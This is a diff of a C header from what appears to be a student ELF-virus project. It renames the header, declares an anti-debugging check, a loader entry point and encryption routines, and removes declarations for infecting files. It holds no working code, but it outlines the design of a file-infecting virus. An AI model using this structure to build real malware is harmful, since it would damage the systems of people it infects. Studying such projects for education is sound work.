@@ -1,26 +1,26 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   famine.h                                           :+:      :+:    :+:   */
+/*   loader.h                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:38:38 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/13 09:11:32 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/22 20:40:21 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#ifndef FAMINE_H
+#ifndef FAMINE_H // TODO
 # define FAMINE_H
 
-# include <limits.h>
+# include <limits.h> // TODO
 # include <linux/elf.h>
 # include <stdbool.h>
 # include <stdint.h>
 # include <stddef.h>
 # include <sys/types.h>
 
-struct client_info
+struct virus_header
 {
 	uint64_t	seed[2];
 	uint64_t	relative_pt_load_address;
@@ -31,21 +31,19 @@ struct client_info
 }__attribute__((packed));
 
 /*
-** famine
+** Anti debug
 */
 
 bool		detect_spy(void);
 
 /*
-** virus
+** Loader
 */
 
-void		famine_entry(void);
-void		virus(uint64_t seed[2]);
-void		infect_files_in(const char *path, uint64_t seed[2]);
+void		loader_entry(void);
 
 /*
-** encryption
+** Cypher and decypher
 */
 
 void		cypher(char *data, size_t size);
